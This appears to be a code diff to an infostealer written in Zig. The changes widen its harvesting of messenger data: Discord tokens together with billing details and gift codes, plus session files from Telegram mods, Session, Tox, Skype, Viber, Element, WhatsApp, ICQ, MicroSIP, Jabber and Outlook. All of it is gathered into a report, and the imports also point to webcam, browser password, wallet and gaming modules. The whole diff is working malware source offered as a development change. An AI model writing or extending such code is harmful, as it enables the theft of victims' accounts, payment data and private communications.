@@ -27,6 +27,9 @@ const appbound = @import("browsers/appbound.zig");
 const system_info = @import("system/system_info.zig");
 const chromium = @import("browsers/chromium.zig");
 const firefox = @import("browsers/firefox.zig");
+const yandex_passman = @import("browsers/yandex_passman.zig");
+const appbound_flags = @import("crypto/appbound_flags.zig");
+const webcam = @import("system/webcam.zig");
 const wallets_mod = @import("wallets/wallets.zig");
 const messengers_mod = @import("messengers/messengers.zig");
 const gaming_mod = @import("gaming/gaming.zig");
@@ -91,16 +94,38 @@ fn freeBrowserData(bd: chromium.BrowserData, allocator: std.mem.Allocator) void 
 }
 
 fn freeMessengerData(md: messengers_mod.MessengerData, allocator: std.mem.Allocator) void {
-    for (md.discord_tokens) |s| allocator.free(s);
-    allocator.free(md.discord_tokens);
+    for (md.discord_accounts) |*a| a.deinit(allocator);
+    allocator.free(md.discord_accounts);
     for (md.telegram_files) |s| allocator.free(s);
     allocator.free(md.telegram_files);
+    for (md.telegram_mod_files) |s| allocator.free(s);
+    allocator.free(md.telegram_mod_files);
     for (md.signal_files) |s| allocator.free(s);
     allocator.free(md.signal_files);
     for (md.pidgin_accounts) |s| allocator.free(s);
     allocator.free(md.pidgin_accounts);
     for (md.pidgin_logs) |s| allocator.free(s);
     allocator.free(md.pidgin_logs);
+    for (md.session_files) |s| allocator.free(s);
+    allocator.free(md.session_files);
+    for (md.tox_files) |s| allocator.free(s);
+    allocator.free(md.tox_files);
+    for (md.skype_files) |s| allocator.free(s);
+    allocator.free(md.skype_files);
+    for (md.viber_files) |s| allocator.free(s);
+    allocator.free(md.viber_files);
+    for (md.element_files) |s| allocator.free(s);
+    allocator.free(md.element_files);
+    for (md.whatsapp_files) |s| allocator.free(s);
+    allocator.free(md.whatsapp_files);
+    for (md.icq_files) |s| allocator.free(s);
+    allocator.free(md.icq_files);
+    for (md.microsip_files) |s| allocator.free(s);
+    allocator.free(md.microsip_files);
+    for (md.jabber_files) |s| allocator.free(s);
+    allocator.free(md.jabber_files);
+    for (md.outlook_files) |s| allocator.free(s);
+    allocator.free(md.outlook_files);
 }
 
 fn addLinesToReport(report: *std.ArrayList(u8), lines: [][]const u8) void {
@@ -202,24 +227,71 @@ fn buildReport(allocator: std.mem.Allocator, local_app_data: []const u8, roaming
     const msgr_data = messengers_mod.collect(allocator, roaming_app_data, local_app_data) catch |e| blk: {
         log("[!] messengers.collect failed: {}\n", .{e});
         break :blk messengers_mod.MessengerData{
-            .discord_tokens = &.{},
+            .discord_accounts = &.{},
             .telegram_files = &.{},
+            .telegram_mod_files = &.{},
             .signal_files = &.{},
             .pidgin_accounts = &.{},
             .pidgin_logs = &.{},
+            .session_files = &.{},
+            .tox_files = &.{},
+            .skype_files = &.{},
+            .viber_files = &.{},
+            .element_files = &.{},
+            .whatsapp_files = &.{},
+            .icq_files = &.{},
+            .microsip_files = &.{},
+            .jabber_files = &.{},
+            .outlook_files = &.{},
         };
     };
     report.appendSlice("=== Messengers ===\n") catch {};
-    report.appendSlice("--- Discord Tokens ---\n") catch {};
-    addStringsToReport(&report, msgr_data.discord_tokens);
+    report.appendSlice("--- Discord Accounts ---\n") catch {};
+    for (msgr_data.discord_accounts) |acct| {
+        report.appendSlice("Token: ") catch {};
+        report.appendSlice(acct.token) catch {};
+        report.appendSlice("\n") catch {};
+        if (acct.has_billing) {
+            report.appendSlice("  Billing: ") catch {};
+            report.appendSlice(acct.billing_summary) catch {};
+            report.appendSlice("\n") catch {};
+        }
+        if (acct.gift_codes.len > 0) {
+            report.appendSlice("  Gifts: ") catch {};
+            report.appendSlice(acct.gift_codes) catch {};
+            report.appendSlice("\n") catch {};
+        }
+    }
     report.appendSlice("--- Telegram Files ---\n") catch {};
     addStringsToReport(&report, msgr_data.telegram_files);
+    report.appendSlice("--- Telegram Mod Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.telegram_mod_files);
     report.appendSlice("--- Signal Files ---\n") catch {};
     addStringsToReport(&report, msgr_data.signal_files);
     report.appendSlice("--- Pidgin Accounts ---\n") catch {};
     addStringsToReport(&report, msgr_data.pidgin_accounts);
     report.appendSlice("--- Pidgin Logs ---\n") catch {};
     addStringsToReport(&report, msgr_data.pidgin_logs);
+    report.appendSlice("--- Session Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.session_files);
+    report.appendSlice("--- Tox Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.tox_files);
+    report.appendSlice("--- Skype Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.skype_files);
+    report.appendSlice("--- Viber Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.viber_files);
+    report.appendSlice("--- Element Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.element_files);
+    report.appendSlice("--- WhatsApp Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.whatsapp_files);
+    report.appendSlice("--- ICQ Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.icq_files);
+    report.appendSlice("--- MicroSIP Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.microsip_files);
+    report.appendSlice("--- Jabber Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.jabber_files);
+    report.appendSlice("--- Outlook Files ---\n") catch {};
+    addStringsToReport(&report, msgr_data.outlook_files);
     freeMessengerData(msgr_data, allocator);
 
     logMsg("[+] Collecting gaming platforms...\n");
